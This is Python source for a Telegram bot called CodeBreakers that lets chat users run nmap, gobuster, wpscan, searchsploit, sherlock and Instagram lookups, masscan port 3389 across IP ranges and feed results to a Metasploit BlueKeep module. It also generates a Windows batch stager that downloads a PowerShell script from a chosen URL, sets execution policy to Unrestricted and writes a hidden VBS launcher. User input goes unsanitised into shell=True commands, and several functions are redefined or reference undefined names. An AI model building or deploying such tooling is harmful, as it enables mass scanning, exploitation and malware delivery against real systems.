import subprocess
import telebot
import os
import tempfile
from instagrapi import Client
from telebot import types

TOKEN = 'TOKEN'  # GET YOUR TOKEN ON BOTFATHER

bot = telebot.TeleBot(TOKEN)

user_histories = {}
ongoing_scans = {}


@bot.message_handler(commands=['start'])
def handle_start(message):
    user_id = message.from_user.id
    bot.send_message(user_id, "Welcome to CodeBreakers Bot!\nYou can use /nmap to start an Nmap scan.")
    initialize_user_history(user_id)


@bot.message_handler(commands=['nmap'])
def handler_nmap(message):
    user_id = message.from_user.id
    bot.send_message(user_id, "Please enter the target IP:")
    initialize_user_history(user_id)

    bot.register_next_step_handler(message, lambda m: handle_nmap_target(m, user_id))


def handle_nmap_target(message, user_id):
    target = message.text.strip()

    bot.send_message(user_id, "Please select the type of Nmap scan you want to run:")
    markup = telebot.types.ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard=True)
    markup.row("Quick Scan", "Medium Scan")
    markup.row("Vulnerable Scan", "Service Scan")

    bot.send_message(user_id, "Please select a scan type:", reply_markup=markup)
    bot.register_next_step_handler(message, lambda m: handle_nmap_type(m, target, user_id))


def handle_nmap_type(message, target, user_id):
    user_input = message.text.lower()

    scan_options = {
        "quick scan": "-T4 -F",
        "medium scan": "-T4 -A",
        "vulnerable scan": "-T4 --script vuln",
        "service scan": "-sV",
    }

    if user_input in scan_options:
        nmap_command = f"nmap {scan_options[user_input]} {target}"
        bot.send_message(user_id, f"Executing Nmap {user_input} for target: {target}")

        process = subprocess.Popen(nmap_command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        ongoing_scans[user_id] = {"process": process, "command": nmap_command}

        update_user_history(user_id, f"/nmap {user_input} {target}")

        monitor_scan(user_id)
    else:
        bot.send_message(user_id, "Please select a valid option: Quick Scan, Medium Scan, Vulnerable Scan, or Service Scan.")


@bot.message_handler(commands=['dirbuster'])
def handle_gobuster(message):
    user_id = message.from_user.id
    bot.send_message(user_id, "Please enter the target URL (e.g., http://example.com):")
    bot.register_next_step_handler(message, lambda m: get_gobuster_target(m, user_id))


def get_gobuster_target(message, user_id):
    target = message.text.strip()
    wordlist = "/usr/share/seclists/Discovery/Web-Content/raft-small-words.txt"
    output_file = "/tmp/gobuster_output.txt"

    gobuster_command = f"gobuster dir -u {target} -w {wordlist} -o {output_file}"
    bot.send_message(user_id, f"Executing Gobuster for target: {target}")

    process = subprocess.Popen(gobuster_command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    ongoing_scans[user_id] = {"process": process, "command": gobuster_command, "output_file": output_file}

    monitor_scan(user_id)

def monitor_scan(user_id):
    if user_id in ongoing_scans:
        process = ongoing_scans[user_id]["process"]
        command = ongoing_scans[user_id]["command"]
        output_file = ongoing_scans[user_id]["output_file"]
        _, _ = process.communicate()

        if process.returncode == 0:
            with open(output_file, "rb") as file:
                bot.send_document(user_id, file)
            bot.send_message(user_id, f"Gobuster command completed successfully:\n```\n{command}\n```")
        else:
            bot.send_message(user_id, f"Gobuster command failed:\n```\n{command}\n```")
        del ongoing_scans[user_id] 

def monitor_scan(user_id):
    if user_id in ongoing_scans:
        process = ongoing_scans[user_id]["process"]
        stdout, stderr = process.communicate()

        if process.returncode == 0:
            bot.send_message(user_id, "Scan completed successfully.")
            
            
            with tempfile.NamedTemporaryFile(mode='w+', delete=False, suffix='.txt') as output_file:
                output_file.write(stdout.decode('utf-8'))

            
            with open(output_file.name, 'rb') as doc:
                bot.send_document(user_id, doc)
                os.remove(output_file.name)  

        else:
            bot.send_message(user_id, f"Scan failed with exit code {process.returncode}.\n{stderr.decode('utf-8')}")

        del ongoing_scans[user_id]  

@bot.message_handler(commands=['ongoing'])
def handle_ongoing(message):
    user_id = message.from_user.id
    if user_id in ongoing_scans:
        bot.send_message(user_id, f"Ongoing scan: {ongoing_scans[user_id]['command']}")
    

@bot.message_handler(commands=['login'])
def handle_login(message):
    user_id = message.from_user.id
    bot.send_message(user_id, "Please enter your Instagram username:")
    bot.register_next_step_handler(message, get_instagram_username)

def get_instagram_username(message):
    global INSTAGRAM_USERNAME
    INSTAGRAM_USERNAME = message.text
    user_id = message.from_user.id
    bot.send_message(user_id, "Please enter your Instagram password:")
    bot.register_next_step_handler(message, get_instagram_password)

def get_instagram_password(message):
    global INSTAGRAM_PASSWORD
    INSTAGRAM_PASSWORD = message.text
    user_id = message.from_user.id
    bot.send_message(user_id, "Login successful! You can now use /getinfo to retrieve public user information.")

@bot.message_handler(commands=['getinfo'])
def handle_getinfo(message):
    user_id = message.from_user.id
    username_to_lookup = message.text.split(' ', 1)[1]  

    if INSTAGRAM_USERNAME is not None and INSTAGRAM_PASSWORD is not None:
       
        client = Client()
        
       
        try:
            client.login(INSTAGRAM_USERNAME, INSTAGRAM_PASSWORD)

            
            user_info = client.user_info_by_username(username_to_lookup)
            media_count = user_info.media_count  

            info_message = (
                f"Username: {user_info.username}\n"
                f"Full Name: {user_info.full_name}\n"
                f"Followers: {user_info.follower_count}\n"
                f"Following: {user_info.following_count}\n"
                f"Posts: {media_count}"
            )

            bot.send_message(user_id, info_message)
        except Exception as e:
            bot.send_message(user_id, f"Instagram login or information retrieval failed: {str(e)}")
        finally:
            client.logout()
    else:
        bot.send_message(user_id, "Please use /login to provide your Instagram credentials first.")

@bot.message_handler(commands=['search'])
def handle_search(message):
    user_id = message.from_user.id
    bot.send_message(user_id, "Please enter the username you want to search for:")
    bot.register_next_step_handler(message, search_username)

def search_username(message):
    user_id = message.from_user.id
    username_to_search = message.text.strip()

    try:
        
        result = subprocess.check_output(["sherlock", username_to_search]).decode('utf-8')

        
        if username_to_search in result:
            bot.send_message(user_id, f"Username '{username_to_search}' found on social media platforms:\n{result}")
        else:
            bot.send_message(user_id, f"Username '{username_to_search}' not found on social media platforms.")
    except Exception as e:
        bot.send_message(user_id, f"Error: {str(e)}")
#WPSCAN MAINTENANCE
@bot.message_handler(commands=['wpscan'])
def handle_wpscan(message):
    user_id = message.from_user.id
    bot.send_message(user_id, "Please enter the WPScan API token:")
    bot.register_next_step_handler(message, lambda m: get_wpscan_token(m, user_id))

def get_wpscan_token(message, user_id):
    wpscan_api_token = message.text.strip()
    bot.send_message(user_id, "Please enter the target domain:")
    bot.register_next_step_handler(message, lambda m: handle_wpscan_target(m, user_id, wpscan_api_token))

def handle_wpscan_target(message, user_id, wpscan_api_token):
    target = message.text.strip()
    wpscan_command = f"wpscan --url {target} --api-token {wpscan_api_token}"
    bot.send_message(user_id, f"Executing WPScan for target: {target}")

    
    process = subprocess.Popen(wpscan_command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    ongoing_scans[user_id] = {"process": process, "command": wpscan_command}

    
    update_user_history(user_id, f"/wpscan --url '{target}' --api-token -e vp,vt '{wpscan_api_token}'")

    
    monitor_scan(user_id)

def update_user_history(user_id, command):
    if user_id in user_history:
        user_history[user_id].append(command)
    else:
        user_history[user_id] = [command]

def monitor_scan(user_id):
    if user_id in ongoing_scans:
        process = ongoing_scans[user_id]["process"]
        command = ongoing_scans[user_id]["command"]
        output, _ = process.communicate()

        if process.returncode == 0:
            bot.send_message(user_id, f"WPScan command completed successfully:\n```\n{command}\n```\nScan Output:\n```\n{output.decode('utf-8')}\n```")
        else:
            bot.send_message(user_id, f"WPScan command failed:\n```\n{command}\n```\nError Output:\n```\n{output.decode('utf-8')}\n```")
        del ongoing_scans[user_id]
    
def monitor_scan(user_id):
    if user_id in ongoing_scans:
        process = ongoing_scans[user_id]["process"]
        stdout, stderr = process.communicate()

        if process.returncode == 0:
            bot.send_message(user_id, "Scan completed successfully.")
            
            
            with tempfile.NamedTemporaryFile(mode='w+', delete=False, suffix='.txt') as output_file:
                output_file.write(stdout.decode('utf-8'))

            
            with open(output_file.name, 'rb') as doc:
                bot.send_document(user_id, doc)
                os.remove(output_file.name)  

        else:
            bot.send_message(user_id, f"Scan failed with exit code {process.returncode}.\n{stderr.decode('utf-8')}")

        del ongoing_scans[user_id]  


@bot.message_handler(commands=['searchsploit'])
def handle_searchsploit(message):
    user_id = message.from_user.id
    command = message.text.strip()
    keyword = command.replace('/searchsploit', '').strip()
    bot.send_message(user_id, f"Searching for exploits with keyword: {keyword}")
    execute_command(user_id, f"searchsploit '{keyword}'")

def execute_command(user_id, command):
    try:
        with tempfile.TemporaryDirectory() as temp_dir:
            output_file = os.path.join(temp_dir, "output.txt")

           
            with open(output_file, "w") as file:
                completed_process = subprocess.run(
                    command,
                    shell=True,
                    stdout=file,
                    stderr=subprocess.PIPE,
                    text=True,
                    check=True 
                )

            
            with open(output_file, "rb") as file:
                bot.send_document(user_id, file)

            os.remove(output_file)
    except subprocess.CalledProcessError as e:
        bot.send_message(user_id, f"Command failed with exit code {e.returncode}: {e.stderr}")
    except Exception as e:
        bot.send_message(user_id, f"An error occurred: {str(e)}")


user_data = {}


CHOOSING, TOOL_CHOICE, METASPLOIT_CHOICE, RDP_FILE, NUM_HOSTS, RDP_RANGE, RUNNING = range(7)

@bot.message_handler(commands=['rdp'])
def start(message):
    user_id = message.chat.id
    bot.send_message(user_id, "Welcome to the Cybersecurity Tool Bot! You can choose the tool you want to use by typing /choose.")
    user_data[user_id] = {}  

@bot.message_handler(commands=['choose'])
def choose_tool(message):
    user_id = message.chat.id
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
    markup.row("Masscan")
    markup.row("Metasploit")
    bot.send_message(user_id, "Select the tool you want to use:", reply_markup=markup)
    user_data[user_id]['state'] = TOOL_CHOICE

@bot.message_handler(func=lambda message: user_data.get(message.chat.id, {}).get('state') == TOOL_CHOICE)
def handle_tool_choice(message):
    user_id = message.chat.id
    tool_choice = message.text
    user_data[user_id]['tool'] = tool_choice

    if tool_choice == "Masscan":
        bot.send_message(user_id, "Enter the file name to save masscan results (e.g., rdp_masscan.txt):")
        user_data[user_id]['state'] = RDP_FILE
    elif tool_choice == "Metasploit":
        bot.send_message(user_id, "Available Metasploit Exploits:\n1: CVE-2019-0708 BlueKeep\n2: CVE-2021-34527 PrintNightmare\n3: CVE-2021-36942 MS-RDP Licensing\n"
                                  "Enter the number corresponding to the exploit you want to run:")
        user_data[user_id]['state'] = METASPLOIT_CHOICE
    else:
        bot.send_message(user_id, "Invalid choice. Please enter either 'Masscan' or 'Metasploit'.")

@bot.message_handler(func=lambda message: user_data.get(message.chat.id, {}).get('state') == RDP_FILE)
def handle_rdp_file(message):
    user_id = message.chat.id
    rdp_file = message.text
    user_data[user_id]['rdp_file'] = rdp_file

    if not rdp_file:
        bot.send_message(user_id, "Error: The specified file does not exist or is empty.")
    else:
        bot.send_message(user_id, "Enter the IP range to scan (e.g., 192.168.1.0/24):")
        user_data[user_id]['state'] = RDP_RANGE

@bot.message_handler(func=lambda message: user_data.get(message.chat.id, {}).get('state') == RDP_RANGE)
def handle_rdp_range(message):
    user_id = message.chat.id
    ip_range = message.text
    rdp_file = user_data[user_id]['rdp_file']

    run_command(f"masscan -p3389 {ip_range} --rate 10000 --exclude 255.255.255.255 -oG {rdp_file}", capture_output=False)
    masscan_output = run_command(f"cat {rdp_file}", capture_output=True)
    rdp_hosts = get_ip_addresses(masscan_output)
    with open("rdp.txt", "w") as rdp_file:
        rdp_file.write("\n".join(rdp_hosts))
    bot.send_message(user_id, "Masscan completed. The list of RDP hosts has been saved to rdp.txt.")
def run_command(command, capture_output=True):
    try:
        if capture_output:
            result = subprocess.run(command, shell=True, text=True, capture_output=True, check=True)
            return result.stdout
        else:
            subprocess.run(command, shell=True, check=True)
    except subprocess.CalledProcessError as e:
        print(f"Error: {e}")
        return None
@bot.message_handler(func=lambda message: user_data.get(message.chat.id, {}).get('state') == METASPLOIT_CHOICE)
def handle_metasploit_choice(message):
    user_id = message.chat.id
    exploit_choice = message.text
    user_data[user_id]['exploit_choice'] = exploit_choice

    if exploit_choice == "1":
        bot.send_message(user_id, "Enter the number of RDP hosts you want to fetch:")
        user_data[user_id]['state'] = NUM_HOSTS
    elif exploit_choice in ["2", "3"]:
        user_data[user_id]['rdp_file'] = ''  # Initialize rdp_file as an empty string
        bot.send_message(user_id, "Enter the file name containing the list of RDP hosts (e.g., rdp.txt):")
        user_data[user_id]['state'] = RDP_FILE
    else:
        bot.send_message(user_id, "Invalid choice. Please enter a valid exploit number.")

@bot.message_handler(func=lambda message: user_data.get(message.chat.id, {}).get('state') == NUM_HOSTS)
def handle_num_hosts(message):
    user_id = message.chat.id
    num_hosts = message.text
    rdp_file = user_data[user_id]['rdp_file']

    bot.send_message(user_id, f"Running Metasploit BlueKeep exploit on the first {num_hosts} hosts from {rdp_file}...")
    run_command(f"msfconsole -q -x \"use auxiliary/scanner/rdp/cve_2019_0708_bluekeep; set RHOSTS file:{rdp_file}; run\"")

import pyfiglet
from colorama import init, Fore, Style


init()
def print_codebreakers_ascii():
    ascii_art = pyfiglet.figlet_format("Codebreakers", font="slant")
    colored_ascii_art = Fore.RED + ascii_art + Style.RESET_ALL
    return colored_ascii_art

def create_stager(download_url, powershell_path, execution_policy, destination_folder):
    batch_script = f"""@echo off

REM Set the destination folder path for the downloaded file
set "destinationFolder={destination_folder}"

REM Download the file using PowerShell
powershell -Command "(New-Object Net.WebClient).DownloadFile('{download_url}', '%destinationFolder%\\downloaded_file.ps1')"

REM Set execution policy
"{powershell_path}" -Command "Set-ExecutionPolicy {execution_policy} -Scope CurrentUser"

REM Run the downloaded file using PowerShell invisibly on startup
echo Set objShell = CreateObject("WScript.Shell") > "%destinationFolder%\\run_invisible.vbs"
echo objShell.Run "{powershell_path} -ExecutionPolicy Bypass -File %destinationFolder%\\downloaded_file.ps1", 0, False >> "%destinationFolder%\\run_invisible.vbs"

REM Close the command prompt window
exit
"""

    return batch_script

def save_stager_to_file(stager, filename):
    with open(filename, "w") as file:
        file.write(stager)

    return filename  

@bot.message_handler(commands=['stager'])
def handle_start(message):
    user_id = message.chat.id
    bot.send_message(user_id, "Welcome to the Codebreakers Stager Bot! Please enter the download URL:")
    # Initialize user data
    user_data[user_id] = {}

@bot.message_handler(func=lambda message: message.text.startswith("http"))
def handle_download_url(message):
    user_id = message.chat.id
    download_url = message.text
    user_data[user_id]['download_url'] = download_url  # Store download URL
    bot.send_message(user_id, "Please enter the filename for the stager (e.g., download_and_execute.bat):")

@bot.message_handler(func=lambda message: not message.text.startswith("http"))
def handle_filename(message):
    user_id = message.chat.id
    filename = message.text
    download_url = user_data[user_id]['download_url']  # Retrieve download URL
    powershell_path = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
    execution_policy = "Unrestricted"
    destination_folder = os.path.expanduser("~\\Downloads")

    stager = create_stager(download_url, powershell_path, execution_policy, destination_folder)

    stager_filename = save_stager_to_file(stager, filename)

    
    with open(stager_filename, "rb") as stager_file:
        bot.send_document(user_id, stager_file)

    
    script_details = (
        f"Stager created successfully.\n"
        f"Stager filename: {filename}\n"
        f"Download URL: {download_url}\n"
        f"Powershell path: {powershell_path}\n"
        f"Execution policy: {execution_policy}\n"
        f"Destination folder: {destination_folder}"
    )
    bot.send_message(user_id, script_details)


def update_user_history(user_id, command):
    if user_id not in user_histories:
        user_histories[user_id] = []

    user_histories[user_id].append(command)

def initialize_user_history(user_id):
    user_histories[user_id] = []

if __name__ == "__main__":
    
    bot.polling(timeout=30)
